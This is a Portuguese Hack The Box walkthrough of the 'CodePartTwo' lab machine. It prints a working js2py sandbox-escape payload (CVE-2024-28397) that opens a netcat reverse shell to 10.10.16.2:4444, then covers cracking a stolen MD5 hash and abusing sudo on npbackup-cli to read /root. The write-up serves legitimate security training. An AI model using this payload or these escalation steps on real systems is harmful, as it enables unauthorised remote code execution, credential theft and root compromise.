---
title: "Hack The Box - CodePartTwo"
author: "imendes"
date: 2026-01-18
subject: "HTB Walkthrough"
description: "Walkthrough da máquina CodePartTwo (HTB), explorando sandbox escape em js2py para obtenção de execução remota de código e posterior escalada de privilégios."
keywords: ["HTB", "CodePartTwo", "js2py", "sandbox escape", "reverse shell", "SQLite", "sudo", "npbackup-cli"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines,Linux, Easy]
---

## Introdução

Este relatório documenta o processo de exploração da máquina **CodePartTwo** da plataforma **Hack The Box**.  
A máquina apresenta uma aplicação web vulnerável que executa código JavaScript em servidor usando **js2py**, afetado pela vulnerabilidade **CVE-2024-28397**, permitindo escape do ambiente isolado e execução arbitrária de comandos no sistema.  
O objetivo foi obter acesso inicial via exploração da vulnerabilidade e, em seguida, realizar a **escalada de privilégios** até o usuário root.

## Metodologia

A metodologia aplicada seguiu as seguintes fases:

- **Coleta de informações** – identificação de portas e serviços expostos via Nmap.  
- **Enumeração** – análise do aplicativo web e revisão do código-fonte disponível.  
- **Exploração** – execução remota de código via vulnerabilidade js2py (CVE-2024-28397).  
- **Manutenção de acesso** – obtenção de shell reverso e extração de dados do banco.  
- **Escalada de privilégios** – uso de binário privilegiado `npbackup-cli` para acessar o diretório `/root/`.  

## Coleta de Informações

### Varredura Nmap

```bash
# Nmap 7.94SVN scan initiated Sun Oct 19 17:46:14 2025 as: nmap -Pn -sV -oA nmap 10.10.11.82
Nmap scan report for 10.10.11.82
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

**Serviços identificados:**

| Porta    | Serviço | Versão          | Observação                         |
| :------- | :------ | :-------------- | :--------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.2p1   | Acesso remoto                      |
| 8000/tcp | HTTP    | Gunicorn 20.0.4 | Aplicação Flask vulnerável (js2py) |

### Enumeração de Serviços

Durante a análise da aplicação web na porta **8000**, foi identificado que o serviço executava código **JavaScript server-side**, usando a biblioteca **js2py**.
O código-fonte estava disponível publicamente, revelando o uso das seguintes dependências:

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

O banco de dados da aplicação possuía o seguinte esquema:

```sql
CREATE TABLE code (
    id INTEGER NOT NULL, 
    user_id INTEGER NOT NULL, 
    code TEXT NOT NULL, 
    PRIMARY KEY (id), 
    FOREIGN KEY(user_id) REFERENCES user (id)
);

CREATE TABLE user (
    id INTEGER NOT NULL, 
    username VARCHAR(80) NOT NULL, 
    password_hash VARCHAR(128) NOT NULL, 
    PRIMARY KEY (id), 
    UNIQUE (username)
);
```

Foi verificado que a versão **js2py 0.74** era vulnerável à **CVE-2024-28397**, permitindo escape do sandbox e execução de comandos arbitrários no sistema.

## Exploração

A exploração foi realizada através do envio de um payload JavaScript que explorava introspecção de classes Python para encontrar e utilizar o objeto `subprocess.Popen`, permitindo a execução de comandos shell no host.

### Payload usado:

```javascript
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__
let obj = a(a(a,"__class__"), "__base__")
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}
let cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 4444 >/tmp/f"
let res = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(res)
```

Ao executar o payload, foi obtido um **reverse shell** conectado ao atacante (IP `10.10.16.2`, porta `4444`).

Shell estabilizado e TTY interativo:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Com acesso obtido, o atacante explorou o sistema de arquivos e encontrou o banco de dados da aplicação em:

```
/home/app/app/instance/users.db
```

Usando o comando `strings`, foi identificado o hash do usuário **marco**:

```
Mmarco<HASH>
```

Confirmando sua existência via `/etc/passwd`:

```
marco:x:1000:1000:marco:/home/marco:/bin/bash
```

O código fonte revelou que o hash era **MD5**, ele foi quebrado com sucesso via **hashcat** e wordlist **rockyou.txt**, obtendo as credenciais válidas de **SSH**.

### Manutenção de Acesso

Com o acesso confirmado, o atacante estabeleceu sessão persistente via **SSH**:

```bash
ssh marco@10.10.11.82
```

A partir desse ponto, o atacante podia executar comandos locais como o usuário **marco**. Além disso, na home do usuário marco, o atacante pode acessar a flag de usuário.

## Escalada de Privilégios

Verificando permissões sudo:

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

O binário `npbackup-cli` executava com privilégios root, sem necessidade de senha.

Com esse programa, o atacante pode realizar backup do diretório `/root/` para o diretório `/temp`. Foi possível ler os arquivos  por meio da flag `--dump`:

```bash
marco@codeparttwo:/tmp$ cp ~/npbackup.conf .
```
O arquivo npbackup.conf possui configurações acerca do backup. O campo paths foi alterado para atingir o diretório `/root`
```
[...]
backup_opts:
      paths:
      - /root/
[...]
```
O backup foi realizado com o comando:
```bash
sudo npbackup-cli -c npbackup.conf -b -f
```
Agora o seguinte comando consegue recuperar a flag do root:
```bash
marco@codeparttwo:/tmp$ sudo npbackup-cli --dump /root/root.txt --config ./npbackup.conf
```

Flag **root.txt** obtida com sucesso.

---

**Resumo técnico:**

| Etapa          | Vetor de Ataque              | Resultado       |
| :------------- | :--------------------------- | :-------------- |
| Acesso inicial | CVE-2024-28397 em js2py      | Reverse shell   |
| Enumeração     | users.db → hash MD5 de marco | Credenciais SSH |
| Escalada       | Sudo em npbackup-cli         | Root shell      |


## Referências
- [https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
